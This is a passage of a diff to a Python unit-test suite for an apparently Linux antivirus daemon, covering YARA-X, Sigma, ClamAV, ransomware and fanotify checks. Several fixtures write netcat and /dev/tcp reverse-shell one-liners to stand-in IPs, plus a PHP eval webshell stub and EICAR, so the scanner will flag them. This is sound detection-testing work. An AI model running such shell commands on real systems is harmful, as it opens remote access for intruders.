+        with open(clean_file, "w") as f:
+            f.write("nc -e /bin/sh 1.2.3.4 9001")
+        self.assertFalse(guard.handle_file_event(clean_file, "FILE_MODIFIED"))
+        self.assertTrue(guard.handle_file_event(clean_file, "FILE_DELETED"))
+        guard.stop()
+
+    # 55. Phishing Detector
+    def test_phishing(self):
+        pd = PhishingDetector()
+        self.assertFalse(pd.evaluate_url("http://malicious-login-phishing.com"))
+        self.assertTrue(pd.evaluate_url("https://constantine-security.io"))
+
+    # 56. Polkit Authorization Integration
+    def test_polkit_authorization_integration_and_elevation(self):
+        auth = AuthManager()
+        self.assertTrue(auth.check_authorization(100, 0)[0])
+        with patch("subprocess.run") as mock_run:
+            mock_run.return_value = MagicMock(returncode=0, stdout=b"", stderr=b"")
+            self.assertTrue(auth.check_authorization(100, 1000)[0])
+            mock_run.return_value = MagicMock(returncode=1, stdout=b"", stderr=b"Not authorized")
+            self.assertFalse(auth.check_authorization(100, 1000)[0])
+
+    # 57. Privileged Quarantine Operator
+    def test_privileged_quarantine_operator_descriptor_pinning_and_toctou_rejection(self):
+        op = PrivilegedQuarantineOperator()
+        safe = os.path.join(self.temp_dir.name, "pin_test.bin")
+        with open(safe, "w") as f:
+            f.write("content")
+        with op.pin_file_for_quarantine(safe) as handle:
+            self.assertGreater(handle.fd, 0)
+            self.assertEqual(handle.path, safe)
+
+    # 58. Proactive Continuous Scanner
     def test_proactive_continuous_scanner_and_landing_zones(self):
-        """Verifica que el escáner activo continuo audite drop zones y neutralice malware proactivamente."""
-        from core.engine.proactive_scanner import ProactiveContinuousScanner
-        from core.engine.audit_logger import AuditLogger
-        from core.engine.vault import QuarantineVault
+        vault = CryptographicVault(base_dir=self.temp_dir.name)
+        scanner = ProactiveActiveScanner(vault=vault, interval=5.0)
+        scanner.start()
+        drop = os.path.join(self.temp_dir.name, "proactive_drop_zone")
+        os.makedirs(drop, exist_ok=True)
+        bad = os.path.join(drop, "evil_backdoor.sh")
+        with open(bad, "w") as f:
+            f.write("nc -e /bin/sh 10.0.0.1 9001")
+        scanner.scan_landing_zone(drop)
+        self.assertFalse(os.path.exists(bad))
+        scanner.stop()
 
-        mock_drop = os.path.join(self.tmp, "proactive_drop_zone")
-        os.makedirs(mock_drop, exist_ok=True)
+    # 59. Proton VPN Integration
+    def test_proton_vpn_integration_and_separation_of_concerns(self):
+        script = os.path.join(ROOT_DIR, "scripts", "setup_protonvpn.sh")
+        self.assertTrue(os.path.exists(script))
 
-        # Archivo limpio
-        benign_path = os.path.join(mock_drop, "notes.txt")
-        with open(benign_path, "w") as f:
-            f.write("Lista de compras y tareas normales.\n")
+    # 60. Quarantine Read-Only FS Resilience
+    def test_quarantine_with_descriptor_and_read_only_fs_resilience(self):
+        vault = CryptographicVault(base_dir=self.temp_dir.name)
+        sample = os.path.join(self.temp_dir.name, "quar_ro_test.bin")
+        with open(sample, "w") as f:
+            f.write("sample")
+        fd = os.open(sample, os.O_RDONLY)
+        ok, sid = vault.quarantine_file(sample, threat_name="Trojan.ROTest", target_fd=fd)
+        os.close(fd)
+        self.assertTrue(ok)
 
-        # Archivo malicioso (coincide con regla YARA de reverse shell netcat)
-        malware_path = os.path.join(mock_drop, "evil_backdoor.sh")
-        with open(malware_path, "w") as f:
-            f.write("#!/bin/bash\nnc -e /bin/sh 192.168.1.50 9999\n")
+    # 61. Ransomware Canary Tripwire
+    def test_ransomware_canary_tripwire(self):
+        shield = RansomwareShield(canary_dir=self.temp_dir.name)
+        cpath = os.path.join(self.temp_dir.name, "important_document.docx")
+        self.assertFalse(shield.check_canary_access(cpath, 99999, flags=os.O_RDWR))
 
-        audit_log = AuditLogger(log_path=os.path.join(self.tmp, "audit_proactive.json"))
-        vault = self.vault
-        notifier = MagicMock()
+    # 62. Ransomware Extension Burst
+    def test_ransomware_extension_burst_detection(self):
+        shield = RansomwareShield()
+        self.assertFalse(shield.check_extension_burst("/home/user/doc.locked", 88888, is_write=True))
+        self.assertTrue(shield.check_extension_burst("/home/user/doc.locked", 88888, is_write=False))
 
-        proactive = ProactiveContinuousScanner(
-            scanner=self.scanner,
-            vault=vault,
-            notifier=notifier,
-            audit_logger=audit_log,
-            interval_seconds=1.0,
-            target_dirs=[mock_drop]
-        )
+    # 63. Ransomware Read Burst
+    def test_ransomware_read_burst_does_not_trigger_sigkill(self):
+        shield = RansomwareShield()
+        for i in range(100):
+            self.assertTrue(shield.check_extension_burst(f"/home/user/file_{i}.pdf", 1234, is_write=False))
 
-        proactive.start()
-        self.assertTrue(proactive.running)
+    # 64. Ransomware Read-Only Canary Allowed
+    def test_ransomware_read_only_canary_allowed(self):
+        shield = RansomwareShield(canary_dir=self.temp_dir.name)
+        cpath = os.path.join(self.temp_dir.name, "important_document.docx")
+        self.assertTrue(shield.check_canary_access(cpath, 1234, flags=os.O_RDONLY))
 
-        # Forzar un barrido proactivo inmediato
-        proactive.trigger_immediate_sweep()
-        time.sleep(0.5)
+    # 65. Scanner Clean File
+    def test_scanner_clean_file(self):
+        scanner = Scanner()
+        clean = os.path.join(self.temp_dir.name, "clean.txt")
+        with open(clean, "w") as f:
+            f.write("plain text")
+        rep = scanner.scan_file(clean)
+        self.assertFalse(rep.is_threat)
 
-        # Verificar que el malware fue aislado del drop zone
-        self.assertFalse(os.path.exists(malware_path), "El archivo malicioso debió ser neutralizado y movido al baúl")
-        self.assertTrue(os.path.exists(benign_path), "El archivo limpio debe permanecer intacto")
+    # 66. Scanner Dev TCP
+    def test_scanner_dev_tcp_reverse_shell(self):
+        scanner = Scanner()
+        fpath = os.path.join(self.temp_dir.name, "tcp.sh")
+        with open(fpath, "w") as f:
+            f.write("bash -i >& /dev/tcp/10.0.0.1/8080 0>&1")
+        rep = scanner.scan_file(fpath)
+        self.assertTrue(rep.is_threat)
 
-        # Verificar telemetría en tiempo real
-        telem = proactive.get_telemetry()
-        self.assertEqual(telem["status"], "PROTECTION_ACTIVE_MONITORING")
-        self.assertTrue(telem["is_active"])
-        self.assertGreaterEqual(telem["files_scanned_count"], 1)
-        self.assertGreaterEqual(telem["threats_neutralized_count"], 1)
+    # 67. Scanner EICAR
+    def test_scanner_eicar_detection(self):
+        scanner = Scanner()
+        fpath = os.path.join(self.temp_dir.name, "eicar.com")
+        with open(fpath, "w") as f:
+            f.write("X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*")
+        rep = scanner.scan_file(fpath)
+        self.assertTrue(rep.is_threat)
 
-        # Verificar registro en auditoría
-        incidents = audit_log.get_incidents()
-        self.assertGreaterEqual(len(incidents), 1)
-        self.assertIn("evil_backdoor.sh", incidents[0]["target"])
+    # 68. Scanner Reverse Shell & Unified Detection Result
+    def test_scanner_reverse_shell_detection(self):
+        scanner = Scanner()
+        fpath = os.path.join(self.temp_dir.name, "rev.sh")
+        with open(fpath, "w") as f:
+            f.write("nc -e /bin/bash 10.0.0.1 4444")
+        rep = scanner.scan_file(fpath)
+        self.assertTrue(rep.is_threat)
+        # Verificación del Formato Unificado de Detección
+        self.assertEqual(rep.engine, "YARA-X")
+        self.assertEqual(rep.severity, "CRITICAL")
+        self.assertEqual(rep.category, "NATIVE_SIGNATURE")
+        self.assertTrue(bool(rep.sha256))
+        rep_dict = rep.to_dict()
+        self.assertIn("category", rep_dict)
+        self.assertIn("sha256", rep_dict)
 
-        proactive.stop()
-        self.assertFalse(proactive.running)
+        # Verificación de detección de firmas comunitarias
+        webshell = os.path.join(self.temp_dir.name, "shell.php")
+        with open(webshell, "w") as f:
+            f.write("<?php eval(base64_decode('aGVsbG8=')); ?>")
+        rep_ws = scanner.scan_file(webshell)
+        self.assertTrue(rep_ws.is_threat)
+        self.assertIn("Community", rep_ws.threat_name)
+        self.assertEqual(rep_ws.category, "COMMUNITY_SIGNATURE")
 
+    # 69. Scanner Update Signatures
+    def test_scanner_update_signatures_syncs_feeds_real(self):
+        scanner = Scanner()
+        res = scanner.update_signatures()
+        self.assertEqual(res["status"], "OK")
+        self.assertIn("community_rules", res)
 
-    def test_clamav_manager_comprehensive_integration(self):
-        """Verifica el gestor integral ClamAV: estado de clamd, firmas actualizables, archivos comprimidos y coordinación on-access."""
-        from core.engine.clamav_manager import ClamAVManager
-        import socket, threading, zipfile
+    # 70. Sigma Event Evaluation
+    def test_sigma_event_evaluation_and_detection(self):
+        sigma = SigmaEngine()
+        matches = sigma.evaluate_process(101, "nc", "/bin/nc", "nc -e /bin/sh 10.0.0.1 4444")
+        self.assertGreaterEqual(len(matches), 1)
 
-        # 1. Servidor mock de clamd para validar respuestas de scanning y keepalive
-        mock_sock_path = os.path.join(self.tmp, "clamd_mgr_test.sock")
-        server_sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
-        server_sock.bind(mock_sock_path)
-        server_sock.listen(5)
+    # 71. Sigma Integration
+    def test_sigma_integration_with_ebpf_and_scanner(self):
+        scanner = Scanner()
+        self.assertIsNotNone(scanner.sigma)
 
-        def mock_server():
-            while True:
-                try:
-                    conn, _ = server_sock.accept()
-                    data = conn.recv(1024).decode("utf-8", errors="ignore")
-                    if "PING" in data:
-                        conn.sendall(b"PONG\n")
-                    elif "VERSION" in data:
-                        conn.sendall(b"ClamAV 1.0.5/27020/2026\n")
-                    elif "SCAN" in data:
-                        if "threat" in data:
-                            conn.sendall(b"/path/threat.bin: Win.Trojan.Agent-999 FOUND\n")
-                        else:
-                            conn.sendall(b"/path/clean.bin: OK\n")
-                    conn.close()
-                except Exception:
-                    break
+    # 72. Sigma Native Import
+    def test_sigma_native_import_and_facade(self):
+        import sigma
+        self.assertTrue(hasattr(sigma, "SigmaEngine"))
 
-        th = threading.Thread(target=mock_server, daemon=True)
-        th.start()
-        time.sleep(0.1)
+    # 73. Sigma Rule Parsing
+    def test_sigma_rule_parsing_and_modifiers(self):
+        sigma = SigmaEngine()
+        self.assertGreaterEqual(len(sigma.rules), 6)
 
-        mgr = ClamAVManager(
-            socket_path=mock_sock_path,
-            threat_intel=self.scanner.intel,
-            vault=self.vault,
-            auto_start_daemon=False
-        )
+    # 74. Subsystem Health Registry
+    def test_subsystem_health_registry_evaluation(self):
+        reg = SubsystemHealthRegistry()
+        reg.register("vault", "ACTIVE")
+        reg.register("fanotify", "ACTIVE")
+        self.assertEqual(reg.get_overall_posture()["posture"], "HEALTHY")
 
-        self.assertTrue(mgr.is_engine_available())
-        ver = mgr.get_engine_version()
-        self.assertIn("ClamAV 1.0.5", ver)
-
-        status_info = mgr.get_status_info()
-        self.assertTrue(status_info["clamd_available"])
-        self.assertTrue(status_info["archive_protection_active"])
-
-        # 2. Análisis de malware conocido
-        threat_file = os.path.join(self.tmp, "threat_sample.bin")
-        with open(threat_file, "w") as f:
-            f.write("dummy threat")
-        is_inf, name, details = mgr.scan_file(threat_file)
-        self.assertTrue(is_inf)
-        self.assertEqual(name, "ClamAV.Win.Trojan.Agent-999")
-
-        # 3. Análisis de archivo comprimido infectado
-        zip_path = os.path.join(self.tmp, "container_with_threat.zip")
-        with zipfile.ZipFile(zip_path, "w") as zf:
-            zf.writestr("clean_doc.txt", "texto limpio")
-            zf.writestr("threat.bin", "contenido hostil detectado por mock clamd")
-
-        is_zip_inf, zip_threat, zip_details = mgr.scan_file(zip_path)
-        self.assertTrue(is_zip_inf)
-        self.assertIn("Win.Trojan.Agent-999", zip_threat)
-
-        # 4. Coordinación On-Access con fanotify y prevención de loops
-        mock_interceptor = MagicMock()
-        mock_interceptor.whitelist = MagicMock()
-        coord_res = mgr.coordinate_on_access_protection(mock_interceptor)
-        self.assertEqual(coord_res["on_access_mode"], "FANOTIFY_SYNCHRONOUS_COOPERATIVE")
-
-        # 5. Ejecución de actualización de firmas (tolerante a ausencia de red o freshclam)
-        update_res = mgr.update_signatures(timeout=2)
-        self.assertIn("message", update_res)
-
-        server_sock.close()
-
-
+    # 75. Systemd Security Auditor
     def test_systemd_security_auditor_compliance(self):
-        """Verifica la evaluación del SystemdSecurityAuditor y el cumplimiento de las recomendaciones oficiales."""
-        from core.engine.systemd_hardening import SystemdSecurityAuditor
         service_file = os.path.join(ROOT_DIR, "service", "constantine.service")
         auditor = SystemdSecurityAuditor(unit_path=service_file)
         posture = auditor.evaluate_security_posture()
@@ -2169,1324 +847,871 @@ class TestConstantineSecurity(unittest.TestCase):
         self.assertGreaterEqual(posture["score"], 90)
         self.assertEqual(posture["rating"], "HARDENED_EXCELLENT")
         self.assertIn("NoNewPrivileges", posture["passed_checks"])
-        self.assertIn("ProtectSystem", posture["passed_checks"])
         self.assertIn("ProtectHome", posture["passed_checks"])
-        self.assertIn("PrivateTmp", posture["passed_checks"])
         self.assertIn("CapabilityBoundingSet", posture["passed_checks"])
-        self.assertIn("DevicePolicy", posture["passed_checks"])
-        self.assertIn("SystemCallFilter", posture["passed_checks"])
-        self.assertIn("SystemCallArchitectures", posture["passed_checks"])
 
+    # 76. Systemd Service Isolation & Hardening
+    def test_systemd_service_isolation_and_hardening(self):
+        service_file = os.path.join(ROOT_DIR, "service", "constantine.service")
+        with open(service_file, "r") as f:
+            content = f.read()
+        self.assertIn("NoNewPrivileges=true", content)
+        self.assertIn("ProtectSystem=strict", content)
+        self.assertIn("ProtectHome=read-only", content)
+        self.assertIn("/var/lib/constantine", content)
+        rw_paths = [line.split("=", 1)[1].split() for line in content.splitlines() if line.startswith("ReadWritePaths=")][0]
+        self.assertNotIn("/home", rw_paths)
+        self.assertNotIn("/tmp", rw_paths)
+        caps = [line.split("=", 1)[1].split() for line in content.splitlines() if line.startswith("CapabilityBoundingSet=")][0]
+        self.assertNotIn("CAP_DAC_OVERRIDE", caps)
 
-    def test_polkit_authorization_integration_and_elevation(self):
-        """Verifica la delegación de autorización en Polkit y la ejecución segura de constantine-helper."""
-        from core.auth.auth_manager import AuthManager
-        import subprocess
-
-        auth = AuthManager()
-        self.assertTrue(auth.is_polkit_available(), "pkcheck debe estar disponible en el sistema")
-
-        # Mock de subprocess.run para validar autorización exitosa sin diálogo de escritorio en entorno headless
-        with unittest.mock.patch("subprocess.run") as mock_run:
-            mock_run.return_value = unittest.mock.MagicMock(returncode=0, stdout=b"", stderr=b"")
-            ok, tok = auth.request_polkit_authorization("org.constantine.antivirus.admin.unlock")
-            self.assertTrue(ok)
-            self.assertIsNotNone(tok)
-            self.assertTrue(auth.is_session_valid(tok))
-
-            mock_run.assert_called_once()
-            called_cmd = mock_run.call_args[0][0]
-            self.assertEqual(called_cmd[0], "pkcheck")
-            self.assertIn("--action-id=org.constantine.antivirus.admin.unlock", called_cmd)
-            self.assertIn("--allow-user-interaction", called_cmd)
-
-        # Mock de fallo/cancelación por parte del usuario
-        with unittest.mock.patch("subprocess.run") as mock_run_fail:
-            mock_run_fail.return_value = unittest.mock.MagicMock(returncode=1, stdout=b"", stderr=b"Not authorized")
-            ok_fail, tok_fail = auth.request_polkit_authorization("org.constantine.antivirus.admin.unlock")
-            self.assertFalse(ok_fail)
-            self.assertIsNone(tok_fail)
-
-        # Validación de argumentos estrictos de constantine-helper
-        helper_path = os.path.join(ROOT_DIR, "service", "constantine-helper")
-        res_help = subprocess.run([sys.executable, helper_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        self.assertNotEqual(res_help.returncode, 0, "Invocar sin argumentos debe fallar")
-        self.assertIn(b"Comando requerido", res_help.stderr)
-
-        res_invalid_action = subprocess.run([sys.executable, helper_path, "evil-action"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        self.assertNotEqual(res_invalid_action.returncode, 0)
-        self.assertIn(b"no reconocida", res_invalid_action.stderr)
-
-    def test_fanotify_anti_deadlock_and_infrastructure_bypass(self):
-        """
-        Verifica la prevención crítica de bloqueos mutuos (Deadlock Prevention):
-        1. Comprueba que PIDs ignorados (PID propio, init PID 1, kernel PID 2) reciban FAN_ALLOW inmediato.
-        2. Comprueba que rutas de infraestructura propia (/opt/constantine) y ClamAV (/var/lib/clamav) reciban FAN_ALLOW.
-        3. Comprueba que procesos reconocidos (clamd, freshclam) sean añadidos a ignored_pids y reciban FAN_ALLOW.
-        4. Comprueba que add_ignored_pid y add_ignored_comm funcionen correctamente.
-        """
-        mock_scanner = MagicMock()
-        interceptor = FanotifyInterceptor(scanner=mock_scanner, vault=self.vault)
-
-        # 1. Registro de PIDs y Comms
-        interceptor.add_ignored_pid(99991)
-        self.assertIn(99991, interceptor.ignored_pids)
-        interceptor.add_ignored_comm("clamd")
-        self.assertIn("clamd", interceptor.ignored_comm_names)
-
-        # 2. Evaluación de PID en ignored_pids
-        from core.engine.interceptor import AuthorizationContext, FAN_ALLOW, FAN_DENY, FAN_OPEN_PERM
-        ctx_ignored_pid = AuthorizationContext(fan_fd=-1, event_fd=-1, pid=99991, mask=FAN_OPEN_PERM, fallback_decision=FAN_DENY)
-        interceptor._evaluate_event(ctx_ignored_pid)
-        self.assertTrue(ctx_ignored_pid.responded)
-        self.assertEqual(ctx_ignored_pid.decision, FAN_ALLOW)
-        self.assertEqual(ctx_ignored_pid.reason, "SELF_OR_SYSTEM_PID")
-
-        # 3. Evaluación de PID init (1) y kernel (2)
-        ctx_init = AuthorizationContext(fan_fd=-1, event_fd=-1, pid=1, mask=FAN_OPEN_PERM, fallback_decision=FAN_DENY)
-        interceptor._evaluate_event(ctx_init)
-        self.assertEqual(ctx_init.decision, FAN_ALLOW)
-        self.assertEqual(ctx_init.reason, "SELF_OR_SYSTEM_PID")
-
-        # 4. Evaluación de ruta de infraestructura Constantine
-        ctx_infra = AuthorizationContext(fan_fd=-1, event_fd=-1, pid=8888, mask=FAN_OPEN_PERM, fallback_decision=FAN_DENY)
-        with unittest.mock.patch("os.readlink", return_value="/opt/constantine/daemon.py"):
-            interceptor._evaluate_event(ctx_infra)
-            self.assertEqual(ctx_infra.decision, FAN_ALLOW)
-            self.assertEqual(ctx_infra.reason, "SELF_INFRASTRUCTURE")
-
-        # 5. Evaluación de ruta de base de datos ClamAV
-        ctx_clamav = AuthorizationContext(fan_fd=-1, event_fd=-1, pid=8888, mask=FAN_OPEN_PERM, fallback_decision=FAN_DENY)
-        with unittest.mock.patch("os.readlink", return_value="/var/lib/clamav/daily.cld"):
-            interceptor._evaluate_event(ctx_clamav)
-            self.assertEqual(ctx_clamav.decision, FAN_ALLOW)
-            self.assertEqual(ctx_clamav.reason, "CLAMAV_INFRASTRUCTURE")
-
-        # 6. Evaluación de proceso con comm ignorado (ej. clamd)
-        ctx_comm = AuthorizationContext(fan_fd=-1, event_fd=-1, pid=77112, mask=FAN_OPEN_PERM, fallback_decision=FAN_DENY)
-        with unittest.mock.patch("os.readlink", return_value="/home/user/document.txt"),              unittest.mock.patch.object(interceptor, "get_process_name", return_value="clamd"):
-            interceptor._evaluate_event(ctx_comm)
-            self.assertEqual(ctx_comm.decision, FAN_ALLOW)
-            self.assertEqual(ctx_comm.reason, "IGNORED_COMM")
-            self.assertIn(77112, interceptor.ignored_pids)
-
-    def test_interceptor_state_separation_and_lifecycle(self):
-        """
-        Verifica la separación estricta de estados en interceptor.py:
-        1. Estado inicial: is_initialized=False, is_marked=False, running=False, is_active()=False, is_running()=False.
-        2. Inicializado sin marcas: is_initialized=True, is_active()=False.
-        3. Con marcas fijadas antes de arrancar el hilo: is_marked=True, is_active()=True, is_running()=False.
-           (Garantiza que is_active() no exija running=True, resolviendo el defecto P0).
-        4. Arranque de hilo con start(): running=True, is_running()=True, event_thread.is_alive()=True.
-        5. Detención limpia con stop(): is_initialized=False, is_marked=False, running=False, is_active()=False.
-        """
-        mock_scanner = MagicMock()
-        interceptor = FanotifyInterceptor(scanner=mock_scanner, vault=self.vault)
-
-        # 1. Estado inicial
-        self.assertFalse(interceptor.is_initialized)
-        self.assertFalse(interceptor.is_marked)
-        self.assertFalse(interceptor.running)
-        self.assertFalse(interceptor.is_active())
-        self.assertFalse(interceptor.is_running())
-
-        # 2. Inicializado pero sin marcas
-        interceptor.is_initialized = True
-        interceptor.fan_fd = 55
-        self.assertTrue(interceptor.is_initialized)
-        self.assertFalse(interceptor.is_marked)
-        self.assertFalse(interceptor.is_active(), "Sin marcas no debe considerarse activo")
-
-        # 3. Con marcas reales pero sin hilo de eventos corriendo
-        interceptor.marked_paths.add("/tmp")
-        self.assertTrue(interceptor.is_marked)
-        self.assertTrue(interceptor.is_active(), "Con marcas e inicializado debe ser is_active() True aunque running sea False")
-        self.assertFalse(interceptor.running)
-        self.assertFalse(interceptor.is_running())
-
-        # 4. Hilo de eventos en ejecución
-        def fake_loop():
-            while interceptor.running:
-                time.sleep(0.01)
-
-        with unittest.mock.patch.object(interceptor, "process_events", fake_loop):
-            ok = interceptor.start()
-            self.assertTrue(ok)
-            self.assertTrue(interceptor.running)
-            self.assertTrue(interceptor.is_running())
-            self.assertTrue(interceptor.is_active())
-
-        # 5. Detención limpia
-        interceptor.stop()
-        self.assertFalse(interceptor.is_initialized)
-        self.assertFalse(interceptor.is_marked)
-        self.assertFalse(interceptor.running)
-        self.assertFalse(interceptor.is_active())
-        self.assertFalse(interceptor.is_running())
-
-    def test_daemon_startup_workflow_and_active_verification(self):
-        """
-        Verifica el flujo completo de arranque de daemon.main():
-        1. Inicialización de todos los subsistemas (Vault, Scanner, Ransomware, Interceptor, eBPF, etc.).
-        2. Registro de PIDs y exclusión anti-deadlock.
-        3. Superación de comprobaciones is_active() y verificación de hilo de eventos vivo con start().
-        4. Ejecución del Sanity Check con --test-startup y salida limpia con código 0 / retorno True.
-        """
-        import daemon as daemon_mod
-
-        # Directorio temporal para aislamiento en entorno de prueba
-        test_vault_dir = os.path.join(self.tmp, "daemon_test_vault")
-        test_sock = os.path.join(self.tmp, "daemon_test.sock")
-        test_token = os.path.join(self.tmp, "daemon_test.token")
-        test_health = os.path.join(self.tmp, "daemon_test_health.json")
-
-        def fake_process_events(*args, **kwargs):
-            # Mantiene el hilo vivo mientras running sea True
-            while getattr(fake_process_events, "running", True):
-                time.sleep(0.01)
-        fake_process_events.running = True
-
-        def fake_initialize(interceptor_self):
-            interceptor_self.fan_fd = 88
-            interceptor_self.is_initialized = True
-            return True
-
-        def fake_mark_all_mounts(interceptor_self):
-            interceptor_self.marked_paths.add("/tmp")
-            interceptor_self.is_marked = True
-            return 1
-
-        with unittest.mock.patch.object(daemon_mod.FanotifyInterceptor, "initialize", fake_initialize),              unittest.mock.patch.object(daemon_mod.FanotifyInterceptor, "mark_all_mounts", fake_mark_all_mounts),              unittest.mock.patch.object(daemon_mod.DesktopNotifier, "send"),              unittest.mock.patch.object(daemon_mod.FanotifyInterceptor, "process_events", fake_process_events):
-
-            # Ejecutar el flujo de main con bandera --test-startup
-            startup_ok = daemon_mod.main(
-                args_list=["--mode=all-mounts", "--test-startup"],
-                stop_after_startup=True
-            )
-            fake_process_events.running = False
-            self.assertTrue(startup_ok, "El flujo completo de daemon.main() debe retornar True")
-
-    def test_daemon_type_annotations_and_dispatch_ipc_signature(self):
-        """
-        Verifica el hallazgo P1 en daemon.py:
-        1. Confirma que daemon.py cuenta con 'from __future__ import annotations' y tipos importados (Dict, Any, Tuple, List, Optional).
-        2. Verifica que la función dispatch_ipc_command y main se importen y analicen sin lanzar NameError ni TypeError.
-        3. Comprueba las anotaciones de tipo diferidas de dispatch_ipc_command mediante inspección de código.
-        """
-        import daemon as daemon_mod
-        import inspect
-
-        # 1. Comprobar que __future__.annotations está habilitado en daemon.py
-        with open(os.path.join(ROOT_DIR, "daemon.py"), "r", encoding="utf-8") as f:
-            daemon_src = f.read()
-
-        self.assertIn("from __future__ import annotations", daemon_src, "daemon.py debe incluir postponed evaluation de anotaciones")
-        self.assertIn("from typing import", daemon_src, "daemon.py debe importar tipos desde typing")
-        self.assertIn("Dict", daemon_src)
-        self.assertIn("Any", daemon_src)
-        self.assertIn("Tuple", daemon_src)
-
-        # 2. Comprobar que daemon.py se puede recargar e inspeccionar limpiamente
-        import importlib
-        reloaded = importlib.reload(daemon_mod)
-        self.assertIsNotNone(reloaded)
-
-        # 3. Comprobar que la firma de main incluye tipos válidos
-        sig = inspect.signature(daemon_mod.main)
-        self.assertIn("args_list", sig.parameters)
-        self.assertIn("stop_after_startup", sig.parameters)
-
-
-    def test_clamav_module_import_facade_and_shallow_scan(self):
-        """
-        Verifica la importación directa y fachada de ClamAV:
-        1. Comprueba 'import clamav' y 'from core.engine import clamav'.
-        2. Verifica métodos de conveniencia: is_available, get_version, scan_file, coordinate_on_access.
-        3. Verifica que scanner._scan_file_shallow consulte a clamd cuando esté disponible.
-        """
-        import sys
-        from core.engine import clamav as clamav_mod
-        self.assertIsNotNone(clamav_mod)
-        self.assertTrue(hasattr(clamav_mod, "ClamAVManager"))
-        self.assertTrue(hasattr(clamav_mod, "ClamAVDaemonClient"))
-        self.assertTrue(hasattr(clamav_mod, "scan_file"))
-        self.assertTrue(hasattr(clamav_mod, "is_available"))
-
-        # Comprobar 'import clamav' directo
-        import clamav
-        self.assertIs(clamav, clamav_mod)
-
-        # Mock de clamd para validar escaneo shallow en contenedores
-        test_file = os.path.join(self.tmp, "nested_clam_test.bin")
-        with open(test_file, "w") as f:
-            f.write("clean file without match")
-
-        with unittest.mock.patch.object(self.scanner.clamav_bridge, "is_available", return_value=True),              unittest.mock.patch.object(self.scanner.clamav_bridge, "scan_file", return_value=(True, "Win.Trojan.MockClam-123")):
-            is_mal, threat = self.scanner._scan_file_shallow(test_file)
-            self.assertTrue(is_mal)
-            self.assertEqual(threat, "ClamAV.Win.Trojan.MockClam-123")
-
-
-    def test_yarax_engine_lifecycle_and_dual_coexistence(self):
-        """
-        Verifica el motor evolutivo YARA-X (Rust / VirusTotal):
-        1. Comprueba YaraXEngine, versión, detección y auditoría de compatibilidad de reglas.
-        2. Verifica que las reglas de producción demons.yar superen la validación YARA-X con 100% de preparación.
-        3. Verifica la coexistencia dual sin eliminar libyara ni romper el modo heurístico de respaldo.
-        4. Simula escaneo en disco y memoria mediante YARA-X y su mapeo a YaraMatch.
-        """
-        from core.engine.yarax_engine import YaraXEngine, YaraXMatch
-        from core.engine.yara_manager import YaraRuleManager, YaraMatch
-
-        engine = YaraXEngine(rules_dir=os.path.join(ROOT_DIR, "core", "rules"))
-        self.assertIsNotNone(engine.get_version())
-
-        # 1. Auditoría de compatibilidad del conjunto demons.yar
-        audit_res = engine.audit_rules_directory()
-        self.assertTrue(audit_res["total_files"] >= 1)
-        self.assertGreaterEqual(audit_res["compatible_files"], 1)
-        self.assertEqual(audit_res["incompatible_files"], 0)
-        self.assertEqual(audit_res["migration_readiness"], "100.0%")
-
-        # 2. Validación sintáctica de fuentes YARA-X
-        valid_src = 'rule Sample_Test { strings: $a = "malware" condition: $a }'
-        is_ok, err = engine.validate_rule_source(valid_src)
-        self.assertTrue(is_ok)
-        self.assertIsNone(err)
-
-        invalid_src = "invalid text without rule definition"
-        is_bad, bad_err = engine.validate_rule_source(invalid_src)
-        self.assertFalse(is_bad)
-
-        # 3. Integración en YaraRuleManager
-        mgr = YaraRuleManager(rules_dir=os.path.join(ROOT_DIR, "core", "rules"), engine_mode="dual")
-        self.assertIsNotNone(mgr.yarax_engine)
-        status = mgr.get_status()
-        self.assertIn("has_yarax", status)
-        self.assertIn("engine_mode", status)
-        self.assertEqual(status["engine_mode"], "dual")
-
-        # 4. Mock de escaneo con YARA-X para validar mapeo unificado a YaraMatch
-        mock_yarax_matches = [
-            YaraXMatch(
-                rule="Demons_Reverse_Shell_Rust",
-                namespace="demons",
-                tags=["malware", "reverse_shell"],
-                meta={"description": "Detección Rust YARA-X", "threat_level": "Critical"}
-            )
-        ]
-        with unittest.mock.patch.object(mgr.yarax_engine, "scan_file", return_value=mock_yarax_matches), unittest.mock.patch.object(mgr.yarax_engine, "_compiled_rules", new=True), unittest.mock.patch.object(type(mgr), "has_yarax", new_callable=unittest.mock.PropertyMock(return_value=True)):
-            file_matches = mgr.match_file(os.path.join(ROOT_DIR, "daemon.py"))
-            self.assertEqual(len(file_matches), 1)
-            self.assertEqual(file_matches[0].rule, "Demons_Reverse_Shell_Rust")
-            self.assertEqual(file_matches[0].threat_level, "Critical")
-            self.assertIsInstance(file_matches[0], YaraMatch)
-
-
-    def test_yarax_import_and_compilation_parity(self):
-        """
-        Verifica que 'import yara_x' funcione directamente y valide las reglas demons.yar:
-        1. Comprueba 'import yara_x' sin excepciones de módulo no encontrado.
-        2. Verifica yara_x.compile(), yara_x.Compiler(), rules.scan() y scanner.scan().
-        3. Verifica la compilación y detección sobre cadenas de prueba.
-        """
-        import yara_x
-        self.assertIsNotNone(yara_x)
-        self.assertTrue(hasattr(yara_x, "Compiler"))
-        self.assertTrue(hasattr(yara_x, "compile"))
-        self.assertTrue(hasattr(yara_x, "Scanner"))
-
-        # Compilación directa con yara_x.compile
-        rules = yara_x.compile('rule TestRule { strings: $s = "constantine_pattern" condition: $s }')
-        res = rules.scan(b"sample with constantine_pattern inside")
-        self.assertEqual(len(res.matching_rules), 1)
-        self.assertEqual(res.matching_rules[0].identifier, "TestRule")
-
-        # Compilación con yara_x.Compiler
-        compiler = yara_x.Compiler()
-        with open(os.path.join(ROOT_DIR, "core", "rules", "demons.yar"), "r", encoding="utf-8") as f:
-            demons_src = f.read()
-        compiler.add_source(demons_src, origin="demons.yar")
-        built_rules = compiler.build()
-        self.assertIsNotNone(built_rules)
-
-        # Escaneo de muestra de prueba EICAR con el Scanner de YARA-X
-        scanner = yara_x.Scanner(built_rules)
-        eicar_scan = scanner.scan(b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*")
-        matching_ids = [r.identifier for r in eicar_scan.matching_rules]
-        self.assertIn("Demons_EICAR_Standard_Test", matching_ids)
-
-
-
-    def test_tetragon_native_import_and_facade(self):
